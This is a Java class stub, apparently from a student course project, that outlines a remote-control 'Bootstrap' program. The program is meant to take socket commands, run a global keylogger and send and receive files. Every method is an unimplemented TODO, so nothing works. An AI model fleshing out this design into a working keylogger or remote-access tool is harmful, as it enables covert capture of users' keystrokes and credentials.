package edu.wit.comp2100;

import java.io.File;
import java.nio.file.Path;

public class Bootstrap {

    private static final Path DEFAULT_KEYLOG_PATH = null; //TODO decide on default path
    private static final Path DEFAULT_FILE_PATH = null; //TODO reference path where bootstrap is running/stored
    private File lastReceivedFile;

    /*
    Starts listener thread
     */
    public static void main(String[] args) {

        listen();

    }

    /*
     Starts listener thread
     Listener thread will take input from socket
     Create string array from input
     Pass string array to parseCommand
      */
    private static void listen(){

        //TODO: implement this method

    }

    /*
    Listen invokes this method when it receives a message over the socket
    preforms actions based on arguments
     */
    private void parseCommand(String[] args){

        //TODO: implemnt this method

    }

    /*
    Starts global key-logger thread
    thread will take input-stream from keyboard
    and input it into a file
     */
    private void startKeylogger(){

        //TODO: implement this method

    }

    /*
    Wrapper method to put received files in pre-defined path
     */
    private void recieveFile(){
        recieveFile(DEFAULT_FILE_PATH);
    }

    /*
    Receives file from socket and puts it in the defined path
    uses lastRecievedFile for temporary storage as an object
     */
    private void recieveFile(Path filePath){
        //
        //        //TODO: implement this method

    }

    private void sendFile(){

    }



}
